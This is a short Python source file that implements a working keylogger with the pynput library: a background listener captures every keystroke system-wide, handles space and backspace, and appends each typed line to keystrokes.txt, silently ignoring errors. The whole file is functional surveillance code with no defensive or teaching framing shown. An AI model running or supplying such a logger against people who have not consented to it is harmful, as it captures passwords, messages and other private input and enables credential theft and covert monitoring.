from pynput import keyboard
from datetime import datetime

log_file = "keystrokes.txt"
buffer = []


def on_press(key):
    try:
        if key == keyboard.Key.enter:
            if buffer:
                line = "".join(buffer)
                with open(log_file, "a", encoding="utf-8") as f:
                    f.write(line + "\n")
                buffer.clear()
        elif hasattr(key, 'char') and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.space:
            buffer.append(" ")
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()
    except Exception as e:
        pass  # Could log errors if needed


def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    return listener
